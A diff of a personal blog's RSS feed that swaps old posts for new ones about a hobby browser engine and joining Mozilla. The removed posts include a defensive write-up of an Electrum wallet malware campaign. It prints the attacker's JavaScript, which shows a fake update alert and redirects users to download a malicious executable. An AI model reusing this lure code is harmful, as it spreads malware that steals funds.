@@ -1,181 +1,273 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
     <channel>
-        <title>honk.camp</title>
-        <link>https://honk.camp/</link>
-        <description>Recent content on honk.camp</description>
+        <title>goose.icu</title>
+        <link>/</link>
+        <description>Recent content on goose.icu</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Thu, 22 Jul 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://honk.camp/index.xml" rel="self" type="application/rss+xml" /><item>
-        <title>Malware Promotion via Fake Forums</title>
-        <link>https://honk.camp/p/malware-promotion-via-fake-forums/</link>
-        <pubDate>Thu, 22 Jul 2021 00:00:00 +0000</pubDate>
+        <lastBuildDate>Fri, 27 Oct 2023 00:00:00 +0000</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Introducing Shadow</title>
+        <link>/introducing-shadow/</link>
+        <pubDate>Fri, 27 Oct 2023 00:00:00 +0000</pubDate>
         
-        <guid>https://honk.camp/p/malware-promotion-via-fake-forums/</guid>
-        <description>&lt;h3 id=&#34;discovering&#34;&gt;Discovering&lt;/h3&gt;
-&lt;p&gt;Whilst doing some random googling and looking at some of the last pages, I noticed a recurring pattern in some sites which came up. Then, I noticed this was a method for promoting malware with some interesting ways. This is a writeup on this method.&lt;/p&gt;
-&lt;h3 id=&#34;forums&#34;&gt;Forums&lt;/h3&gt;
-&lt;p&gt;In case you don&amp;rsquo;t know, forums are a popular form of websites for discussing topics, usually having sites dedicated to certain things like computing, companies / projects (like Mozilla, etc). Most of these are legitmate, having actual people talking and most people not being malicious; however these sites are completely fake.&lt;/p&gt;
-&lt;h3 id=&#34;templating&#34;&gt;Templating&lt;/h3&gt;
-&lt;p&gt;The forums I found were essentially HTML templates, swapping some text with what is included in a query parameter (like &lt;code&gt;?q=example+text&lt;/code&gt;) &lt;a class=&#34;link&#34; href=&#34;https://www.php.net&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;PHP&lt;/a&gt;.&lt;/p&gt;
-&lt;h4 id=&#34;site-1&#34;&gt;Site 1&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&#34;https://imgur.com/M5KEHNd.png&#34; alt=&#34;Site 1&#34;  /&gt;&lt;/p&gt;
-&lt;h4 id=&#34;site-2&#34;&gt;Site 2&lt;/h4&gt;
+        <guid>/introducing-shadow/</guid>
+        <description>&lt;p&gt;So I started making a browser engine (for fun) a few days ago, it felt kind of inevitable &lt;a class=&#34;link&#34; href=&#34;https://porffor.goose.icu&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;after starting a JS engine&lt;/a&gt;, so here we are. Here&amp;rsquo;s a short rundown. &lt;a class=&#34;link&#34; href=&#34;https://github.com/canadahonk/shadow&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Source code too!&lt;/a&gt;&lt;/p&gt;
+&lt;h1 id=&#34;try-it-in-your-browserhttpsshadowgooseicu&#34;&gt;&lt;a class=&#34;link&#34; href=&#34;https://shadow.goose.icu&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Try it in your browser!&lt;/a&gt;&lt;/h1&gt;
+&lt;h4 id=&#34;screenshot-of-shadows-welcome-page-running-inside-shadow-as-of-writing&#34;&gt;Screenshot of Shadow&amp;rsquo;s welcome page running inside Shadow (as of writing)&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&#34;https://github.com/CanadaHonk/shadow/assets/19228318/9431b624-94aa-4209-87c9-60d2478badf6&#34; alt=&#34;Screenshot of Shadow&amp;amp;rsquo;s welcome page in shadow&#34;  /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;what&#34;&gt;What?&lt;/h3&gt;
+&lt;p&gt;A browser(/web) engine essentially takes in a URL(/etc) and gives you it rendered into a window for you to view and interact with. Shadow does this too, almost entirely from scratch, made in JS. It runs in your browser! Node backend soon™ too? The host browser(/etc) is only used for networking (&lt;code&gt;fetch&lt;/code&gt;) and renderer backend (&lt;code&gt;&amp;lt;canvas&amp;gt;&lt;/code&gt;).&lt;/p&gt;
+&lt;h4 id=&#34;components-of-shadow&#34;&gt;Components of Shadow&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&#34;https://mermaid.ink/svg/pako:eNpVkT1vhDAMhv8KygxVaTuB1Kljp96axSLukQtJUByK0N399zogFJAyOI_f1x_yXXReoWjENcDYF98_rXRF0YH7A6peqs_eU0zEYZx9MNpdj5R6UH6uGEQ7jBAIwwlnV8LKW2YdUVZmH2c4vzbfBYwGWPwUszn_t4hRQKcwbOX2-KQ8wG2vBGcgmzahUXPSemdwOXKjkXDIjR9-jJV2j9vqvlEed42TTbp1Lu3MJS4DFq9lXdb83gqKwRtsAqr2LKnfy_pjT_MFllaUwvI8oBXf5J7UUsQeLUrRcKggGCmke7IOpugvi-tEE8OEpZhGBRG_NHAhK5pfGAif_zYlpas?bgColor=101418&#34; alt=&#34;Component flowchart&#34;  /&gt;
+(red = external/not me)&lt;/p&gt;
+&lt;h3 id=&#34;why-make-it&#34;&gt;Why make it?&lt;/h3&gt;
+&lt;p&gt;It&amp;rsquo;s just for fun, no really. Learning too. It will probably never work with 90% of websites, and that&amp;rsquo;s okay. &lt;del&gt;Also it&amp;rsquo;s funny to see people react in many forms of &amp;ldquo;wtf?&amp;quot;&lt;/del&gt;&lt;/p&gt;
+&lt;h3 id=&#34;screenshot-of-serenityosorg-running-inside-shadow-left-vs-firefox-right&#34;&gt;Screenshot of serenityos.org running inside Shadow (left) vs Firefox (right)&lt;/h3&gt;
+&lt;p&gt;
+&lt;img src=&#34;https://github.com/CanadaHonk/shadow/assets/19228318/2f9c14e9-a23d-4f92-9f7d-d29aa68ba1bf&#34; width=600&gt;
+&lt;img src=&#34;https://github.com/CanadaHonk/shadow/assets/19228318/19850ac0-2950-4919-8147-a957eefa7c09&#34; width=600&gt;
+&lt;/p&gt;
+&lt;p&gt;Pretty spot on! No list markers yet. Colors are different as UA/browser defined.&lt;/p&gt;
+&lt;h3 id=&#34;name&#34;&gt;Name&lt;/h3&gt;
+&lt;p&gt;As with all my recent projects, the name is because I thought it was kind of funny at the time. Shadow is named after the defunct &amp;lt;shadow&amp;gt; element. I mostly stole this idea from Blink (was it intentional to name it after a dead HTML element at the time?). Also it sounds spooky and mysterious so that&amp;rsquo;s a bonus I guess?&lt;/p&gt;
+&lt;h3 id=&#34;it-supports-javascript&#34;&gt;It supports JavaScript??!&lt;/h3&gt;
+&lt;p&gt;Yes, kind of. This is quite complicated (as you can probably imagine), so I&amp;rsquo;ll do it in a separate future dedicated post if you&amp;rsquo;re interested (DM/reply me on twitter).&lt;/p&gt;
+&lt;h3 id=&#34;why-publish-it&#34;&gt;Why publish it?&lt;/h3&gt;
+&lt;p&gt;Why not? If someone can learn something or just find what I make fun/interesting, that makes me happy :)&lt;/p&gt;
+&lt;h3 id=&#34;but-making-a-new-browser-engine-is-impossible&#34;&gt;But making a new browser engine is impossible!&lt;/h3&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://ladybird.dev&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;No&lt;/a&gt;. &lt;a class=&#34;link&#34; href=&#34;https://servo.org&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;It&lt;/a&gt;. &lt;a class=&#34;link&#34; href=&#34;https://www.ekioh.com/flow-browser/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Isn&amp;rsquo;t&lt;/a&gt;! &lt;em&gt;(Also I don&amp;rsquo;t really care how possible/feasible something is.)&lt;/em&gt;&lt;/p&gt;
 </description>
         </item>
         <item>
-        <title>Electrum Malware Campaign</title>
-        <link>https://honk.camp/p/electrum-malware-campaign/</link>
-        <pubDate>Mon, 22 Feb 2021 00:00:00 +0000</pubDate>
+        <title>Mozilla Chronicles #1</title>
+        <link>/mozilla-chronicles-1/</link>
+        <pubDate>Thu, 12 Oct 2023 00:00:00 +0000</pubDate>
         
-        <guid>https://honk.camp/p/electrum-malware-campaign/</guid>
-        <description>&lt;h3 id=&#34;targeting&#34;&gt;Targeting&lt;/h3&gt;
-&lt;p&gt;The main method of targetting users seems to be via a malicious Google Ads campaign. The main site where users seem to be encountering this is Reddit, &lt;a class=&#34;link&#34; href=&#34;https://reddit.com/r/redditads/comments/lplve0/popup_html_alert_box_about_electrum_wallet_being/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;as seen in this Reddit thread posted&lt;/a&gt;. This seems to be executing JS to make an alert telling users to update Electrum and making an executable download via opening another browser (we will talk about how later in the HTML code review). This can be seen in the apparent content of the alert as said in the Reddit thread:&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;Electrum versions older than 4.0.9 have a vulnerability. Please update Electrum to avoid losing funds.&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;However, the thread is especially useful as the pasted text includes the origin of the iframe: (with escaped URL)&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;An embedded page at electrum-4[dot]github[dot]io says:&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h3 id=&#34;the-site&#34;&gt;The site&lt;/h3&gt;
-&lt;p&gt;As apparent from the url of the site, it is a GitHub Pages site. &lt;a class=&#34;link&#34; href=&#34;https://pages.github.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;GitHub Pages&lt;/a&gt; allows GitHub, a public Git hosting provider (among other services and features), users a way to easily host their repositories online with subdomains under &amp;ldquo;[username].github.io&amp;rdquo;.&lt;/p&gt;
-&lt;h3 id=&#34;the-github-user&#34;&gt;The GitHub user&lt;/h3&gt;
-&lt;p&gt;As it is GitHub Pages, this means the repository could be public, but depends on the how the user set it up. In this instance, by looking at &lt;a class=&#34;link&#34; href=&#34;https://github.com/electrum-4&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;the user&amp;rsquo;s page&lt;/a&gt;, finding it by just plugging it into &amp;ldquo;github.com/[username]&amp;rdquo; from the GitHub Pages subdomain, we can see the repository is open source and public.&lt;/p&gt;
-&lt;h3 id=&#34;the-sites-source&#34;&gt;The site&amp;rsquo;s source&lt;/h3&gt;
-&lt;h4 id=&#34;indexhtml&#34;&gt;&lt;code&gt;index.html&lt;/code&gt;&lt;/h4&gt;
-&lt;p&gt;The index page has a simple user interface, a loading animation. But we are more interested in the JS running in the background. The JS running is quite small, here is the entire source:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;navigator&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;userAgent&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;indexOf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Mac OS&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
-	&lt;span class=&#34;nx&#34;&gt;top&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;location&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;href&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;https://raw.githubusercontent.com/electrum-4/electrum/main/electrum-4.0.9.dmg&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
-&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
-	&lt;span class=&#34;nx&#34;&gt;top&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;location&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;href&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;https://raw.githubusercontent.com/electrum-4/electrum/main/electrum-4.0.9-setup.exe&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
-&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
-
-&lt;span class=&#34;nx&#34;&gt;setTimeout&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
-	&lt;span class=&#34;nb&#34;&gt;window&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;location&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;href&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;https://electrum.org/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
-&lt;span class=&#34;p&#34;&gt;},&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;7000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;A small step-by-step analysis:&lt;/p&gt;
+        <guid>/mozilla-chronicles-1/</guid>
+        <description>&lt;p&gt;&amp;hellip;or I guess day 13 if you include weekends? (I don&amp;rsquo;t even watch big brother.) You can tell this is informal, right? And entirely my own opinions ;)&lt;/p&gt;
+&lt;h3 id=&#34;work-ive-been-doing&#34;&gt;Work I&amp;rsquo;ve been doing&lt;/h3&gt;
 &lt;ul&gt;
-&lt;li&gt;Detect if the website is being ran on a Mac OS device:
-&lt;ul&gt;
-&lt;li&gt;If so: download a .dmg file&lt;/li&gt;
-&lt;li&gt;If not: download a .exe file&lt;/li&gt;
+&lt;li&gt;Implemented and shipped the &lt;a class=&#34;link&#34; href=&#34;https://bugzilla.mozilla.org/show_bug.cgi?id=1791079&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;User Activation API&lt;/a&gt; in my first week!&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;Almost&lt;/em&gt; done lazy loading iframes now too. &lt;a class=&#34;link&#34; href=&#34;https://phabricator.services.mozilla.com/D190662&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Patch is submitted for review&lt;/a&gt; as of writing. Landing that and shipping next week, probably.&lt;/li&gt;
 &lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;After 7 seconds redirect to &lt;a class=&#34;link&#34; href=&#34;https://electrum.org&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;the official Electrum site&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h4 id=&#34;electrumhtml&#34;&gt;&lt;code&gt;electrum.html&lt;/code&gt;&lt;/h4&gt;
-&lt;p&gt;I am pretty sure this is the HTML which is inside the iframe which ran. It is very similar to the &lt;code&gt;index.html&lt;/code&gt; in concept, however without the UI and with different download methods.&lt;/p&gt;
-&lt;p&gt;The JavaScript (ran via script):&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;navigator&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;navigator&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;userAgent&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;indexOf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Windows&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
-	&lt;span class=&#34;nx&#34;&gt;alert&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;\n\nElectrum versions older than 4.0.9 have a vulnerability. Please update Electrum to avoid losing funds.\n\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
-	&lt;span class=&#34;nx&#34;&gt;location&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;href&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;microsoft-edge:https://electrum-4.github.io/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
-&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;navigator&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;navigator&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;userAgent&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;indexOf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Mac OS&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
-	&lt;span class=&#34;nx&#34;&gt;prompt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;\n\nElectrum versions older than 4.0.9 have a vulnerability. Please update Electrum to avoid losing funds.\n\nCopy the following URL and paste it to your browser address bar:\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;https://electrum-4.github.io/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
-&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Another small step-by-step analysis:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;If on Windows:
-&lt;ul&gt;
-&lt;li&gt;Alert the user to trick them into downloading and running the malicious executable&lt;/li&gt;
-&lt;li&gt;Try and download it by attempting to open Microsoft Edge with the link to the main index page&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;Else, if on Mac OS:
-&lt;ul&gt;
-&lt;li&gt;Make a prompt to try and get the user to open the main index page into their browser&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id=&#34;the-binaries&#34;&gt;The binaries&lt;/h3&gt;
-&lt;p&gt;The binaries are stored in another GitHub repo under the same user (&lt;code&gt;electrum-4/electrum&lt;/code&gt;), as the JS in the site uses a raw GitHub URL (a way of accessing a file in a GitHub repo directly via a URL) to download the binaries. I will not go into the actual binaries here as I am not experienced with that side.&lt;/p&gt;
-&lt;h3 id=&#34;final-notes&#34;&gt;Final Notes&lt;/h3&gt;
-&lt;p&gt;I have contacted GitHub with a link to this writeup to attempt to get the user / repos taken down to prevent further users from being attacked. Thanks.&lt;/p&gt;
-&lt;h3 id=&#34;trivia--extra-info&#34;&gt;Trivia / Extra Info&lt;/h3&gt;
-&lt;ul&gt;
-&lt;li&gt;Whilst the GitHub Pages repo is committed via the GitHub user, the actual repo with the binaries has commits made by the author &lt;code&gt;root &amp;lt;root@vps.server.local&amp;gt;&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id=&#34;update-1820-utc&#34;&gt;Update (18:20 UTC)&lt;/h3&gt;
-&lt;p&gt;GitHub has now taken the user down, resulting in the binaries no longer being hosted and the GitHub Pages site now no longer being online, meaning no new users can be attacked.&lt;/p&gt;
+&lt;h3 id=&#34;rambling-headlines&#34;&gt;Rambling Headlines&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;Subtly sacrificing anonymity and/or privacy&lt;/strong&gt;: My real name is now obviously tied to my username in some (work) places online publicly, and I&amp;rsquo;m okay with it. I still won&amp;rsquo;t use my name publicly in most situations as it is mostly an unneeded formality (hi Xitter™), for me at least.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Video calls are a necessary pain&lt;/strong&gt;: if you&amp;rsquo;re like me (going to give it a 50% chance), you&amp;rsquo;re not very comfortable with your physical appearance generally. I&amp;rsquo;ve been trying to improve this for the past year or so by going out more, etc. and it has worked quite a bit (introvert&amp;ndash;). Still not liking it most times but slowly becoming accustomed to it.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Blogging™&lt;/strong&gt;: I&amp;rsquo;m trying to post things (see this) now. Even if rambling and mostly meaningless.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Positivity&lt;/strong&gt;: I used to be quite pessimistic but this year I&amp;rsquo;ve mostly improved* that too. I try to just be uplifting because I know it makes me and (hopefully) those around me (be it colleagues, friends, or randoms) happier. I use &lt;code&gt;:)&lt;/code&gt; probably 1000% more than before, heh. Sometimes it feels informal, but if someone thinks that, I don&amp;rsquo;t really care :)          * not necessarily a bad thing but something I don&amp;rsquo;t personally seek&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Glossary glory&lt;/strong&gt;: I&amp;rsquo;ve learnt &lt;em&gt;many&lt;/em&gt; random internal terms over the past month. Some words make me laugh too much (&lt;em&gt;fox&lt;/em&gt;fooding, firehose, chemspill). &lt;a class=&#34;link&#34; href=&#34;https://wiki.mozilla.org/Glossary&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;A lot are public&lt;/a&gt;! :)&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Slack or Matrix? An eternal question&lt;/strong&gt;: Mozilla use both Slack (internal) and Matrix (public). Most engineers prefer Matrix because open-source™ and transparency, etc. Slack is still used for internal talk; important things like dog pictures.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;How public should where you work be?&lt;/strong&gt; This is an interesting question I have been pondering on what my &amp;ldquo;policy&amp;rdquo; should be. While I should be free to just say where I work/what I do whenever to whoever, I should probably also understand the risks. Also I don&amp;rsquo;t want to sound like I&amp;rsquo;m trying to boast/etc. However, anyone with my username can find my profiles on other sites anyway and see where. Risks?&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;I guess someone could report you to your employee making up some yikes claim which could get you investigated/etc. Seems rare though? (Also quite messed up.)&lt;/li&gt;
+&lt;li&gt;Someone might hate your employer for whatever reason and therefore automatically hate you. welp.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;strong&gt;Cool people are cool&lt;/strong&gt;: I work with cool people, both in Mozilla generally and my team (still feels weird to say). They are all great, everyone is very welcoming and nice. That is it :)&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&lt;code&gt;@&amp;lt;bigcorp&amp;gt;.com&lt;/code&gt;&lt;/strong&gt;: Every time I see a &lt;code&gt;@mozilla.com&lt;/code&gt; or &lt;code&gt;@google.com&lt;/code&gt; or &amp;hellip; email to me, I still go !? internally for a second but realize that&amp;rsquo;s normal now.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Not talking about things&lt;/strong&gt;: I mostly try to avoid browser preference talks now. I &lt;em&gt;could&lt;/em&gt;, there is nothing really stopping me. Just it isn&amp;rsquo;t really a good idea, and nothing good would come of it. Also triple checking before posting things publicly since affiliated™.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Work life balance&lt;/strong&gt;: Since beginning, I knew I should take this seriously and glad to say I have been doing so. I have mostly restricted myself to doing work/Mozilla things during my daily working hours (with the odd reply/quick fix). I also intentionally go in another room for breaks, it helps a surprising amount.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Text capitalization&lt;/strong&gt;: I have adopted the approach for using capitals for formal/professional things. and then lack thereof for casual talking. Really, this post should be in lowercase but it is just above the threshold.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Trying to explain my job&lt;/strong&gt;: ~90% of people I talk to understand what I do on a basic level, I work on Firefox, the web browser. What I &lt;em&gt;actually&lt;/em&gt; do for it though, probably &amp;lt;5%. I say &amp;ldquo;DOM&amp;rdquo; and someone either goes &amp;ldquo;oh yeah cool&amp;rdquo; or they don&amp;rsquo;t know what I&amp;rsquo;m talking about at all. For the latter, I usually say something like &amp;ldquo;I work on browser features people who make websites can use to improve them&amp;rdquo;. (wait, is this really a devops job?) Shout out to one person who I said &amp;ldquo;I work at Mozilla&amp;rdquo; to and they said &amp;ldquo;what&amp;rsquo;s Mozilla?&amp;rdquo; - I forget that it isn&amp;rsquo;t 100% known.&lt;/p&gt;
+&lt;p&gt;This is probably all oversharing/rambling, but I&amp;rsquo;m okay with it. (unless it ends up on hacker news or something in which case&amp;hellip; :p)&lt;/p&gt;
 </description>
         </item>
         <item>
-        <title>GooseUpdate v3 Codebase Design</title>
-        <link>https://honk.camp/p/gooseupdate-v3-codebase-design/</link>
-        <pubDate>Wed, 16 Dec 2020 00:00:00 +0000</pubDate>
+        <title>Joining Mozilla</title>
+        <link>/joining-mozilla/</link>
+        <pubDate>Sat, 30 Sep 2023 00:00:00 +0000</pubDate>
         
-        <guid>https://honk.camp/p/gooseupdate-v3-codebase-design/</guid>
-        <description>&lt;h2 id=&#34;gooseupdate-intro&#34;&gt;GooseUpdate Intro&lt;/h2&gt;
-&lt;p&gt;GooseUpdate is an alternative Discord update endpoint which gives users both normal Discord updates with mods (of the user&amp;rsquo;s choice) patched into them automatically. &lt;a class=&#34;link&#34; href=&#34;https://github.com/GooseMod/GooseUpdate&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;You can find it on GitHub&lt;/a&gt;, and also look at &lt;a class=&#34;link&#34; href=&#34;https://updates.goosemod.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;the online dashboard&lt;/a&gt;.&lt;/p&gt;
-&lt;h2 id=&#34;v3&#34;&gt;v3&lt;/h2&gt;
-&lt;p&gt;I started making v3 as the code for GooseUpdate was becoming more complicated and cluttered; since all the code was in one JS file. The idea for v3 was to split it up to be more manageable, plus more easy to maintain and improve in the future.&lt;/p&gt;
-&lt;h2 id=&#34;eventual-structure&#34;&gt;Eventual Structure&lt;/h2&gt;
-&lt;p&gt;&lt;img src=&#34;https://media.discordapp.net/attachments/690477562857521174/788521809346953226/unknown.png#float-left&#34; alt=&#34;VSCode screenshot of the directory structure&#34;  /&gt;&lt;/p&gt;
+        <guid>/joining-mozilla/</guid>
+        <description>&lt;p&gt;Hey! Big news first: &lt;strong&gt;I join Mozilla on October 1st to work on Firefox full-time&lt;/strong&gt;! Specifically a software engineer on the &lt;a class=&#34;link&#34; href=&#34;https://wiki.mozilla.org/DOM/Core&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;DOM Core team&lt;/a&gt;. I am extremely excited to work on the web platform full-time. This post covers the basics of who and how. If you have any questions feel free to &lt;a class=&#34;link&#34; href=&#34;https://twitter.com/CanadaHonk&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;DM me&lt;/a&gt;. (Good luck job hunters!)&lt;/p&gt;
